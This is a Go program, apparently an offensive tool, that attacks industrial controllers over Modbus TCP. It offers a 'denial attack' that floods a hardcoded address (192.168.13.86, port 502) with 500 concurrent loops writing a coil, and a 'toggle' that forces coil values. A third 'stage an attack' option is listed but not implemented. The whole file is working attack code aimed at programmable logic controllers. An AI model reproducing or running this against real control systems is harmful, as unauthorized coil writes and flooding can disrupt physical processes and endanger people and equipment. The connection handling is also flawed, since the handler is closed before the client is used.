package main

import (
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/goburrow/modbus" //Import the necessary modbus library
)

var wait sync.WaitGroup

func modbusConnection(ip_address string) modbus.Client {
	target := ip_address + ":502" //Send Modbus traffic the specified IP on the Modbus port
	handler := modbus.NewTCPClientHandler(target)
	handler.Timeout = 10 * time.Second

	err := handler.Connect()
	if err != nil {
		fmt.Print("I AM IN CONNECTION")
		fmt.Print(err)
	}

	defer handler.Close()

	client := modbus.NewClient(handler)

	return client
}

func jammer(target modbus.Client, coil uint16, coil_value int) {
	for {
		if coil_value == 1 {
			results, err := target.WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
			if err != nil {
				fmt.Println(err)
				fmt.Println(results)
			}
		} else {
			results, err := target.WriteSingleCoil(coil, 0x0000)
			if err != nil {
				fmt.Println(err)
				fmt.Println(results)
				fmt.Print("I am in the jammer")
			}
		}
	}
}

func denial(ip_address string, jamming int, runtime int, coil uint16, coil_val int) {
	for i := 0; i < jamming; i++ {
		wait.Add(1)
		go jammer(modbusConnection(ip_address), uint16(coil), coil_val)
	}

	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
	go func() {
		<-timer2.C
		fmt.Println("Denial attack completed")
		os.Exit(0)
	}()
	wait.Wait()
}

func toggle(ip_address string, coil uint16, coil_value int) {
	if coil_value == 1 {
		results, err := modbusConnection(ip_address).WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
		if err != nil {
			fmt.Println(err)
			fmt.Println(results)
		}
	} else {
		results, err := modbusConnection(ip_address).WriteSingleCoil(coil, 0x0000)
		if err != nil {
			fmt.Println(err)
			fmt.Println(results)
			fmt.Print("I AM IN TOGGLE")
		}
	}

}

func main() {

	for {
		var userSelection int

		fmt.Println("Enter 1) For denial attack 2) Toggle 3) Stage an attack")
		fmt.Scanln(&userSelection)

		if userSelection == 1 {
			// var ip_address string
			// fmt.Println("Enter an ip address")
			// fmt.Scanln(&ip_address)

			// var jamming int
			// fmt.Println("Enter a number of jammers")
			// fmt.Scanln(&jamming)

			// var runtime int
			// fmt.Println("Enter a runtime:")
			// fmt.Scanln(&runtime)

			// var coil uint16
			// fmt.Println("Enter a coil:")
			// fmt.Scanln(&coil)

			// var coil_value int
			// fmt.Println("Enter a coil value:")
			// fmt.Scanln(&coil_value)

			//denial(ip_address, jamming, runtime, coil, coil_value)
			go denial("192.168.13.86", 500, 1, 0, 0)
		} else if userSelection == 2 {
			// var ip_address string
			// fmt.Println("Enter an ip address")
			// fmt.Scanln(&ip_address)

			// var coil uint16
			// fmt.Println("Enter a coil:")
			// fmt.Scanln(&coil)

			var coil_value int
			fmt.Println("Enter a coil value:")
			fmt.Scanln(&coil_value)

			go toggle("192.168.13.86", 0, coil_value)
		}

	}
}
